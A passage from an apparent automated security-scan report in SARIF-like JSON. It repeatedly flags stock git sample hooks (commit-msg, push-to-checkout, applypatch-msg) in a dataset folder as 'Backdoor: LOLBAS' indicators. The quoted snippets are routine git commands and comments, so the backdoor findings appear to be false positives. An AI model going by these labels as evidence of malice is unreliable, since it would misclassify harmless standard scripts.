                      "text": "# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n\n",
                      "markdown": "`# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 34,
                  "endLine": 15,
                  "endColumn": 39,
                  "snippet": {
                    "text": "# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n",
                    "rendered": {
                      "text": "# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n",
                      "markdown": "`# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \"git commit\" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \"git commit\" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \"git commit\" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 77,
                  "startColumn": 15,
                  "endLine": 77,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                    "rendered": {
                      "text": "\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                      "markdown": "`\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 10,
                  "endLine": 7,
                  "endColumn": 18,
                  "snippet": {
                    "text": "#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n",
                    "rendered": {
                      "text": "#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n",
                      "markdown": "`#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 27,
                  "endLine": 3,
                  "endColumn": 35,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 75,
                  "startColumn": 4,
                  "endLine": 75,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\tdie \"Working directory has staged changes\"\nfi\n\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                    "rendered": {
                      "text": "\tdie \"Working directory has staged changes\"\nfi\n\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                      "markdown": "`\tdie \"Working directory has staged changes\"\nfi\n\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 4,
                  "endLine": 70,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \"Working directory has staged changes\"\nfi\n",
                    "rendered": {
                      "text": "\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \"Working directory has staged changes\"\nfi\n",
                      "markdown": "`\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \"Working directory has staged changes\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 18,
                  "endLine": 63,
                  "endColumn": 24,
                  "snippet": {
                    "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                    "rendered": {
                      "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                      "markdown": "`# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 2,
                  "endLine": 63,
                  "endColumn": 7,
                  "snippet": {
                    "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                    "rendered": {
                      "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                      "markdown": "`# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 55,
                  "startColumn": 4,
                  "endLine": 55,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\tdie \"Up-to-date check failed\"\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \"Working directory has unstaged changes\"\nfi\n",
                    "rendered": {
                      "text": "\tdie \"Up-to-date check failed\"\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \"Working directory has unstaged changes\"\nfi\n",
                      "markdown": "`\tdie \"Up-to-date check failed\"\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \"Working directory has unstaged changes\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 4,
                  "endLine": 50,
                  "endColumn": 9,
                  "snippet": {
                    "text": "# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \"cd ..\" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \"Up-to-date check failed\"\nfi\n",
                    "rendered": {
                      "text": "# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \"cd ..\" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \"Up-to-date check failed\"\nfi\n",
                      "markdown": "`# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \"cd ..\" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \"Up-to-date check failed\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 39,
                  "endLine": 37,
                  "endColumn": 44,
                  "snippet": {
                    "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                    "rendered": {
                      "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                      "markdown": "`# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 25,
                  "endLine": 37,
                  "endColumn": 30,
                  "snippet": {
                    "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                    "rendered": {
                      "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                      "markdown": "`# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 40,
                  "endLine": 36,
                  "endColumn": 45,
                  "snippet": {
                    "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                    "rendered": {
                      "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                      "markdown": "`#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 6,
                  "endLine": 36,
                  "endColumn": 11,
                  "snippet": {
                    "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                    "rendered": {
                      "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                      "markdown": "`#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 21,
                  "endLine": 35,
                  "endColumn": 26,
                  "snippet": {
                    "text": "# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n",
                    "rendered": {
                      "text": "# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n",
                      "markdown": "`# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 58,
                  "endLine": 34,
                  "endColumn": 64,
                  "snippet": {
                    "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                    "rendered": {
                      "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                      "markdown": "`# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 38,
                  "endLine": 34,
                  "endColumn": 43,
                  "snippet": {
                    "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                    "rendered": {
                      "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                      "markdown": "`# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 63,
                  "endLine": 6,
                  "snippet": {
                    "text": "\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n",
                    "rendered": {
                      "text": "\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n",
                      "markdown": "`\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 58,
                  "endLine": 3,
                  "endColumn": 63,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/applypatch-msg.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
